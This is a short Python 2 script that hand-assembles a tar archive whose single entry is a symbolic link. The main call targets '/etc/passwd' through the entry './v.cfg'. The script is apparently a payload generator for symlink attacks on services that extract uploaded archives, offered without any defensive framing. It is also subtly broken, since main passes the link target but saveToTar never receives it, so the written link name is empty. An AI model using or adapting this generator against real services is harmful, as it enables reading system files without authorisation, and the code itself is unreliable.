#!/usr/bin/env python2
# coding=utf-8

import os
import tarfile


def _tarfile(content_name, linkname):
    if len(content_name) > 100:
        print 'content_name error'
        return False
    content_data = b''
    t_name = content_name + b'\x00' * (100 - len(content_name))
    t_linkname = linkname + b'\x00' * (100 - len(linkname))
    t_block = content_data + b'\x00' * (512 - len(content_data))
    _a = t_name + b'0000664\x000001750\x000001750\x0000000000000\x0001274124644\x00'
    _b = b'2' + t_linkname + b'ustar\x32\x32\x00' + \
        (b'root' + b'\x00' * 28) * 2 + b'\x00' * 199
    _t = _a + _b
    _sum = 0
    for j in str(_t):
        _sum += ord(j)
    t_chksum = b'0' * (8 - len(bytes(oct(_sum + 256)))) + \
        bytes(oct(_sum + 256))
    return bytearray(_a + t_chksum + _b + t_block + b'\x00' * 512)


def saveToTar(filename='v.tar', content_name=b'./v.conf', ln=b''):
    f = open(filename, 'wb')
    f.write(_tarfile(content_name, ln))
    f.close()
    if not tarfile.is_tarfile(filename):
        print('error')
    else:
        print('Success')


def main(filename, content_name, ln):
    print 'Runing...'
    saveToTar(filename, content_name)
    if os.path.exists(filename):
        print os.path.join("./", filename)
    else:
        print False

if __name__ == '__main__':
    main('test.tar', b'./v.cfg', b'/etc/passwd')
